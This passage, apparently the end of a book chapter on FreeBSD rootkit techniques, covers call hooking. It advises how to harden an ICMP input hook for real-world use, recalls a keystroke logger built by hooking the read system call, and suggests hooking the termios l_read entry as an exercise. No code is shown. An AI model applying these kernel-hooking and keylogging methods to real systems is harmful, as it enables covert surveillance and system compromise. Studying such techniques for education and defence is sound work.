+</pre><p>Admittedly, <code class="literal">icmp_input_hook</code> has some flaws; however, for the purpose of demonstrating a communication protocol hook, it's more than sufficient.</p><p>If you are interested in fixing up <code class="literal">icmp_input_hook</code> for use in the real world, you only need to make two additions. First, make sure that the IP datagram actually contains an ICMP message before you attempt to locate it. This can be achieved by checking the length of the data field in the IP header. Second, make sure that the data within <code class="literal">m</code> is actually there and accessible. This can be achieved by calling <code class="literal">m_pullup</code>. For example code on how to do both of these things, see the <code class="literal">icmp_input</code> function in /sys/netinet/ip_icmp.c.</p></div>
+<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="concluding_remarks-id2"/>Concluding Remarks</h1></div></div></div><p>As you can see, call hooking is really all about redirecting function pointers, and at this point, you should have no trouble doing that.<a id="IDX-CHP-2-0167" class="indexterm"/></p><p>Keep in mind that there are usually a few different entry points you could hook in order to accomplish a specific task. For example, in <a class="xref" href="ch02s02.html" title="Keystroke Logging">Keystroke Logging</a> I created a keystroke logger by hooking the <code class="literal">read</code> system call; however, this can also be accomplished by hooking the <code class="literal">l_read</code> entry point in the terminal line discipline (termios)<sup>[<a id="CHP-2-FN-4" href="#ftn.CHP-2-FN-4" class="footnote">4</a>]</sup> switch table.</p><p>For educational purposes and just for fun, I encourage you to try to hook the <code class="literal">l_read</code> entry point in the termios switch table. To do so, you'll need to be familiar with the <code class="literal">linesw[]</code> switch table, which is implemented in the file /sys/kern/tty_conf.c, as well as <code class="literal">struct linesw</code>, which is defined in the <code class="literal">&lt;sys/linedisc.h&gt;</code> header.<a id="IDX-CHP-2-0168" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>This hook entails a bit more work than the ones shown throughout this chapter.</p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-2-FN-4" href="#CHP-2-FN-4" class="para">4</a>] </sup><sup>4</sup> The terminal line discipline (termios) is essentially the data structure used to process communication with a terminal and to describe its state.</p></div></div></div></body></html>
